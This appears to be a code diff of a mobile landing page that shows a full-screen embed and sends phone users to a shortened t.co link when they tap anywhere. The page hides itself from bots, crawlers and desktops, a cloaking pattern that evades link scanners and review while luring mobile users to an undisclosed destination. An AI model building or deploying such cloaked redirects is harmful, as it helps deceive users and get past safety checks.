@@ -2,50 +2,56 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Landing Page</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Landing</title>
   <style>
     html, body {
       margin: 0;
       padding: 0;
       height: 100%;
       width: 100%;
+      background: #000;
+      overflow: hidden;
       display: flex;
       justify-content: center;
       align-items: center;
-      background: #000;
-      font-family: sans-serif;
-      overflow: hidden;
+      font-family: system-ui, sans-serif;
     }
 
     .container {
       position: relative;
-      width: 100%;
-      max-width: 400px;
-      aspect-ratio: 9 / 16; /* Instagram Reel aspect ratio */
-      border-radius: 20px;
-      overflow: hidden;
-      box-shadow: 0 0 25px rgba(0,0,0,0.6);
+      width: 100vw;
+      height: 100vh;
+      max-width: 420px; /* Limits width for large phones */
+      aspect-ratio: 9 / 16; /* Keep IG Reel ratio */
       background: #000;
+      border-radius: 0;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      touch-action: manipulation;
     }
 
+    /* The Imgur embed itself */
     .container iframe,
     .container img {
       width: 100%;
       height: 100%;
-      border: 0;
+      border: none;
+      object-fit: cover;
       display: block;
     }
 
-    /* Message for blocked devices */
+    /* Message for blocked users (non-mobile/bots) */
     body.blocked {
+      background: #000;
+      color: #fff;
       display: flex;
       justify-content: center;
       align-items: center;
-      background: #000;
-      color: #fff;
       text-align: center;
-      font-size: 1.2rem;
+      font-size: 1.1rem;
       padding: 20px;
     }
   </style>
@@ -63,28 +69,29 @@
   <script>
     const targetUrl = "https://t.co/hw376Xavsh";
 
-    // Detect if it's a mobile device
+    // Detect if it's a mobile or tablet
     function isMobile() {
-      return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
+      return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
     }
 
-    // Detect bots
+    // Detect bots or crawlers
     function isBot() {
       return /bot|crawler|spider|crawling/i.test(navigator.userAgent);
     }
 
+    // Block desktops and bots
     if (!isMobile() || isBot()) {
       document.body.classList.add('blocked');
       document.body.innerHTML = "<p>⚠️ Please open this page on your phone or tablet.</p>";
     } else {
-      // Show the main content for mobile users
+      // Show main content for real mobile users
       const main = document.getElementById("mainContent");
-      main.style.display = "block";
+      main.style.display = "flex";
 
       // Redirect when the user taps anywhere
       document.body.addEventListener("click", () => {
         window.location.href = targetUrl;
-      });
+      }, { once: true });
     }
   </script>
 
